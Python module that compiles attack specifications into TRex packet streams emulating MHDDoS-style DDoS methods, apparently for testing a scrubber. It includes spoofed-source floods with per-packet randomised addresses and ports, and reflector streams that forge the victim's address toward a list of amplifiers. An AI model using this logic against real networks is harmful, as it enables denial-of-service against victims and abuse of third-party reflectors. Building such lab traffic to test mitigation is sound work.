"""AttackSpec + LinkSpec + RunSpec -> TRex stateless streams.

Two source models, because they are two different attacks:

``pool``
    Each stream owns one baked source address and source port, and ``TCP.seq`` advances by
    the payload length. A scrubber reassembles a coherent request stream from one client -
    what N attacker threads actually look like.

``random`` / ``reflector``
    The field engine rewrites ``IP.src`` (``IP.dst`` for reflector) and ``sport`` per
    packet, i.e. a spoofed flood. Rewritten headers invalidate both checksums, so these
    streams carry a repair instruction: ``STLVmFixChecksumHw`` (NIC TX offload; TRex has no
    software L4 checksum instruction) or ``STLVmFixIpv4`` for ICMP, whose own checksum does
    not cover the IP header.
"""

import ipaddress

from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import Dot1Q, Ether
from scapy.packet import Raw
from trex.stl.api import (
    CTRexVmInsFixHwCs,
    STLPktBuilder,
    STLScVmRaw,
    STLStream,
    STLTXCont,
    STLVmFixChecksumHw,
    STLVmFixIpv4,
    STLVmFlowVar,
    STLVmWrFlowVar,
)

from .catalog import SPECS
from .spec import AttackSpec, BuildCtx, LinkSpec, Proto, RunSpec, SrcMode, Verdict

L4_TYPE = {Proto.UDP: CTRexVmInsFixHwCs.L4_TYPE_UDP, Proto.TCP: CTRexVmInsFixHwCs.L4_TYPE_TCP}
L4_NAME = {Proto.UDP: "UDP", Proto.TCP: "TCP"}
SEQ_START = 0x1000
SPORT_START = 1024
SPORT_SPAN = 60000


def _l2(link: LinkSpec) -> Ether:
    frame = Ether(src=link.src_mac, dst=link.dst_mac)
    return frame / Dot1Q(vlan=link.vlan) if link.vlan is not None else frame


def _l4(spec: AttackSpec, dport: int, sport: int):
    if spec.proto is Proto.TCP:
        return TCP(sport=sport, dport=dport, flags=spec.flags, seq=SEQ_START)
    if spec.proto is Proto.UDP:
        return UDP(sport=sport, dport=dport, chksum=0)
    return ICMP(type=8, id=SEQ_START & 0xFFFF)


def _pad(pkt, size: int | None):
    if size is None or len(pkt) >= size:
        return pkt
    return pkt / Raw(b"\x00" * (size - len(pkt)))


def _spoof(name: str, field: str, low: int, high: int) -> list:
    return [
        STLVmFlowVar(name=name, min_value=low, max_value=high, size=4, op="random"),
        STLVmWrFlowVar(fv_name=name, pkt_offset=field),
    ]


def _cycle(name: str, field: str, addresses: tuple[str, ...]) -> list:
    """Rotate through an explicit address list.

    A random range over min..max would invent addresses that are not in the list, and
    MHDDoS only ever sends to reflectors it was given. ``value_list`` cycles them in order.
    """
    values = [int(ipaddress.ip_address(a)) for a in addresses]
    return [
        STLVmFlowVar(name=name, value_list=values, size=4, op="inc"),
        STLVmWrFlowVar(fv_name=name, pkt_offset=field),
    ]


def _sport(spec: AttackSpec) -> list:
    return [
        STLVmFlowVar(name="sport", min_value=SPORT_START, max_value=SPORT_START + SPORT_SPAN, size=2, op="random"),
        STLVmWrFlowVar(fv_name="sport", pkt_offset=f"{L4_NAME[spec.proto]}.sport"),
    ]


def _checksum(spec: AttackSpec) -> list:
    if spec.proto is Proto.ICMP:
        return [STLVmFixIpv4(offset="IP")]
    return [
        STLVmFixChecksumHw(
            l3_offset="IP", l4_offset=L4_NAME[spec.proto], l4_type=L4_TYPE[spec.proto]
        )
    ]


def _vm_pool(spec: AttackSpec, payload_len: int) -> STLScVmRaw | None:
    """TCP continuity: one flow per stream, sequence advancing with the payload."""
    if spec.proto is not Proto.TCP:
        return None
    return STLScVmRaw(
        [
            STLVmFlowVar(
                name="seq",
                min_value=SEQ_START,
                max_value=SEQ_START + 0xFFFF,
                step=max(1, payload_len),
                size=4,
                op="inc",
            ),
            STLVmWrFlowVar(fv_name="seq", pkt_offset="TCP.seq"),
            STLVmFixChecksumHw(l3_offset="IP", l4_offset="TCP", l4_type=L4_TYPE[Proto.TCP]),
        ]
    )


def _vm_spoof(spec: AttackSpec, low: int, high: int) -> STLScVmRaw:
    instructions = [] if spec.proto is Proto.ICMP else _sport(spec)
    instructions += _spoof("src", "IP.src", low, high)
    instructions += _checksum(spec)
    return STLScVmRaw(instructions)


def _vm_reflector(spec: AttackSpec, reflectors: tuple[str, ...]) -> STLScVmRaw:
    """Destination rotates over the reflector list; source claims to be the victim."""
    return STLScVmRaw(_sport(spec) + _cycle("dst", "IP.dst", reflectors) + _checksum(spec))


def _src_pool(prefix: str, flows: int) -> list[str]:
    net = ipaddress.ip_network(prefix, strict=False)
    first = int(net.network_address) + 1
    span = max(1, int(net.broadcast_address) - first)
    return [str(ipaddress.ip_address(first + (i % span))) for i in range(flows)]


def _dport(name: str, spec: AttackSpec, run: RunSpec, source) -> int:
    """A method's own port wins; amplifiers carry theirs in MHDDoS's table."""
    if spec.dport:
        return spec.dport
    if spec.src_mode is SrcMode.REFLECTOR and name in source.amplifiers:
        return source.amplifiers[name][1]
    return run.dport


def build_streams(name: str, run: RunSpec, link: LinkSpec, ctx: BuildCtx, source) -> list[STLStream]:
    spec = SPECS[name]
    if spec.verdict not in (Verdict.WIRE, Verdict.SHAPE):
        raise ValueError(f"{name} is not emittable: {spec.verdict.value}")

    dport = _dport(name, spec, run, source)
    per_stream = max(1, run.pps // max(1, run.flows))
    net = ipaddress.ip_network(run.src_prefix, strict=False)
    low = int(net.network_address) + 1
    high = max(low, int(net.broadcast_address) - 1)
    sources = _src_pool(run.src_prefix, run.flows)
    reflectors = run.reflectors or (run.victim,)

    streams = []
    for index in range(run.flows):
        payload = spec.build(ctx, index, source) if spec.build else b""

        if spec.src_mode is SrcMode.REFLECTOR:
            dst, src = reflectors[index % len(reflectors)], run.victim
            vm = _vm_reflector(spec, reflectors)
        elif spec.src_mode is SrcMode.RANDOM:
            dst, src = run.victim, sources[0]
            vm = _vm_spoof(spec, low, high)
        else:
            dst, src = run.victim, sources[index]
            vm = _vm_pool(spec, len(payload))

        pkt = _l2(link) / IP(src=src, dst=dst) / _l4(spec, dport, SPORT_START + index)
        if payload:
            pkt = pkt / Raw(payload)
        pkt = _pad(pkt, run.size)

        streams.append(
            STLStream(
                name=f"{name}-{index}",
                packet=STLPktBuilder(pkt=pkt, vm=vm) if vm else STLPktBuilder(pkt=pkt),
                mode=STLTXCont(pps=per_stream),
            )
        )
    return streams
